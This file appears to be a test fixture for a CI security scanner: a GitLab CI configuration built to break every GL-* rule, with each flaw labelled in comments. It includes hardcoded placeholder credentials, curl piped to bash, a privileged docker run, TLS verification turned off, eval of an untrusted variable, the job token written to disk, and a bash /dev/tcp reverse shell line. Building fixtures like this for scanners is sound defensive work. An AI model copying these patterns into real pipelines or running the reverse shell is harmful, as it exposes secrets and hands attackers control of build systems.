# Realistic insecure GitLab CI exhibiting every GL-* failure mode.
include:
  - project: 'templates/ci'
    ref: main
  - remote: 'https://gitlab.example.com/snippets/42/raw'
  # GL-011 — local include resolved from the MR branch.
  - local: 'ci/local-helpers.yml'

image: python:latest

variables:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  DATABASE_PASSWORD: hunter2
  DEPLOY_TARGET: production

# GL-011 — opt the pipeline into MR triggering so include: local fires.
workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
    - if: '$CI_COMMIT_BRANCH'

# GL-012 — cache key derived from MR-controlled commit ref.
cache:
  key: build-${CI_COMMIT_REF_NAME}
  paths:
    - .cache/

stages:
  - test
  - ingest
  - deploy

unit-tests:
  stage: test
  image: node
  script:
    - echo "Running tests for MR ${CI_MERGE_REQUEST_TITLE}"
    - npm test

# GL-010 — multi-project artifact ingestion without verification.
ingest-upstream:
  stage: ingest
  needs:
    - project: 'platform/build'
      job: 'package'
      ref: main
      artifacts: true
  script:
    - ./package/install.sh

deploy-prod:
  stage: deploy
  # GL-014 — self-managed runner without ephemeral tag.
  tags:
    - custom-runner
  script:
    - ./scripts/deploy.sh

# GL-016 — curl piped to shell.
# GL-017 — docker run --privileged.
# GL-018 — pip install from insecure source.
# GL-019 — no vulnerability scanning step.
# GL-020 — CI_JOB_TOKEN written to file.
insecure-setup:
  stage: test
  script:
    - curl https://example.com/setup.sh | bash
    - docker run --privileged myimage
    - pip install --trusted-host pypi.internal.com package
    - echo "$CI_JOB_TOKEN" >> /tmp/token.txt
    # GL-021: package install without lockfile enforcement.
    - npm install
    # GL-022: dependency update bypasses lockfile pins.
    - npm update
    # GL-025: evidence of malicious activity — bash /dev/tcp reverse shell.
    - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    # GL-023: TLS verification bypass.
    - git config --global http.sslVerify false
    # GL-026: dangerous shell idiom — eval re-parses the value as shell.
    - eval "$CI_CUSTOM_CMD"
    # GL-027: pip install from an unpinned git URL.
    - pip install git+https://example.com/internal/helper.git
